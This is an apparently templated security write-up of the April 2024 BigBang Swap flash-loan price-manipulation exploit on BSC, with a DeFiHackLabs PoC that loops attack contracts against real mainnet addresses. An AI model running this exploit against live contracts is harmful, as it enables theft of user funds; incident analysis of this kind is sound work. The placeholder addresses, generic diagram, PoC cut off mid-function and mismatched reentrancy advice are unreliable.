# BigBang Swap — Analysis of Price Invariant Manipulation in BigBang AMM Pool

| Item | Details |
|------|------|
| **Date** | 2024-04-23 |
| **Protocol** | BigBang Swap |
| **Chain** | BSC |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://bscscan.com/address/0x) |
| **Attack Tx** | [0x](https://bscscan.com/tx/0x) |
| **Vulnerable Contract** | [0x](https://bscscan.com/address/0x) |
| **Root Cause** | Price invariant manipulation in BigBang AMM pool |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/BigBangSwap_exp.sol) |

---
## 1. Vulnerability Overview

BigBang Swap is a DeFi protocol operating on the BSC chain that suffered an **AMM price manipulation** attack on 2024-04-23.
The attacker exploited price invariant manipulation in the BigBang AMM pool, causing an estimated **unconfirmed** loss.

### Key Vulnerability Summary
- **Classification**: AMM price manipulation
- **Impact**: Unconfirmed protocol asset loss
- **Attack Vector**: Oracle manipulation

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Issue: Price invariant manipulation in BigBang AMM pool
// The attacker exploits this logic to extract illegitimate profit

// BigBang Swap AMM interface — functions vulnerable to price invariant manipulation
interface IDPPAdvanced {
    // ❌ Vulnerable: continuous sellRewardToken call after flashLoan (DPPFlashLoanCall callback)
    // DODO PMM algorithm's price curve is distorted by large liquidity injection
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
}

interface ITransparentUpgradeableProxy {
    // ❌ Vulnerable: sellRewardToken executes at manipulated price inside flash loan callback
    // Allows reward token dumping without validating AMM price invariant (k = base * quote)
    function sellRewardToken(uint256 amount) external;
}

// ✅ Correct implementation: AMM price invariant validation + block sellRewardToken during flash loan
function safeSellRewardToken(uint256 amount) external {
    // ✅ Block reward token sales while flash loan is active
    require(!dppFlashActive, "Sell: DPP flash loan active");
    // ✅ Verify AMM invariant k is maintained before and after sale
    uint256 kBefore = baseReserve * quoteReserve;
    uint256 expectedQuoteOut = getQuoteAmountForSell(amount);
    require(expectedQuoteOut > 0, "Sell: invalid quote amount");
    // ✅ Cap maximum sell amount per transaction
    require(amount <= maxSellPerTx, "Sell: exceeds per-tx limit");
    _executeSell(amount);
    uint256 kAfter = baseReserve * quoteReserve;
    require(kAfter >= kBefore * (1e18 - MAX_K_DEVIATION) / 1e18, "Sell: invariant violated");
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Identify Vulnerability] ─────── BigBang Swap Contract
  │
  ▼
[Send Malicious Transaction] ─── Call Vulnerable Function
  │                                (Bypass Validation)
  ▼
[Drain Assets] ──────────────── Secure Profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - BigBangSwap_exp.sol
// Chain: BSC | Date: 2024-04-23

    function testExploit() public {
        BUSD.transfer(address(0x000000000000000000000000000000000000dEaD), BUSD.balanceOf(address(this)));

        BUSD.approve(address(Router), type(uint256).max);
        BGG.approve(address(TransparentUpgradeableProxy), type(uint256).max);

        emit log_named_uint("Attacker BUSD balance before attack", BUSD.balanceOf(address(this)));
        DODO.flashLoan(50 * 1e18, 0, address(this), new bytes(1));
        emit log_named_uint("Attacker BUSD balance before attack", BUSD.balanceOf(address(this)));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        for (uint256 i = 0; i < 70; i++) {
            attackContract = new AttackContract();
            BUSD.transfer(address(attackContract), 15 * 1e18);
            attackContract.Attack();
            attackContract.Claim();
        }
        BUSD.transfer(address(DODO), 50 * 1e18);
    }

    fallback() external payable {}
    receive() external payable {}
}

contract AttackContract {
    IERC20 BGG = IERC20(0xaC4d2F229A3499F7E4E90A5932758A6829d69CFF);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakePair BUSD_BGG_LpPool_Pancake = IPancakePair(0x218674fc1df16B5d4F0227A59a2796f13FEbC5f2);
    IPancakePair BUSD_BGG_LpPool_SwapRouter = IPancakePair(0x68E465A8E65521631f36404D9fB0A6FaD62A3B37);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IDPPAdvanced DODO = IDPPAdvanced(0x1B525b095b7353c5854Dbf6B0BE5Aa10F3818FaC);
    ITransparentUpgradeableProxy TransparentUpgradeableProxy =
        ITransparentUpgradeableProxy(0xa45D4359246DBD523Ab690Bef01Da06B07450030);

    address owner;

    constructor() {
        owner = msg.sender;
        BUSD.approve(address(Router), type(uint256).max);
        BGG.approve(address(TransparentUpgradeableProxy), type(uint256).max);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can perform this action");
        _;
    }

    function Attack() external onlyOwner {
        BUSDTOTOKEN();
        TransparentUpgradeableProxy.sellRewardToken(BGG.balanceOf(address(this)));
    }

    function Claim() external onlyOwner {
        BUSD.transfer(owner, BUSD.balanceOf(address(this)));
    }

    function BUSDTOTOKEN() internal {
        address[] memory path = new address[](2);
```

> **Note**: The code above is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Criteria | Details |
|-----------|------|
| **DASP Top 10** | Oracle Manipulation |
| **Attack Type** | AMM Manipulation |
| **Vulnerability Category** | Economic Attack |
| **Attack Complexity** | Medium |
| **Preconditions** | Access to vulnerable function |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause vulnerable functions**: Apply emergency pause to the exploited functions
2. **Assess damage**: Quantify lost assets and classify affected users
3. **Notify relevant parties**: Immediately alert related DEXes, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-Term Improvements
- Conduct **independent security audits** (at least 2 separate audit firms)
- Run a **bug bounty program**
- Establish a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency pause mechanism**

---
## 7. Lessons Learned

### For Developers
1. **AMM price manipulation attacks are preventable**: Defensible with proper validation and pattern application
2. **Consider economic incentives**: Every function must be designed with the attacker's economic motivation in mind
3. **Audit priority**: Functions that directly handle assets are the highest-priority audit targets

### For Protocol Operators
1. **Real-time monitoring**: Build systems to immediately detect abnormally large transactions
2. **Incident response plan**: Maintain a response playbook that can be executed immediately upon attack
3. **Insurance coverage**: Distribute risk through DeFi insurance protocols

### For the Broader DeFi Ecosystem
- The **2024-04-23** BigBang Swap incident reaffirms the danger of **AMM price manipulation** attacks in the BSC ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Strengthening community-level security information sharing is recommended

---
*This document was created for educational and security research purposes. Do not misuse.*
*PoC source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/BigBangSwap_exp.sol)*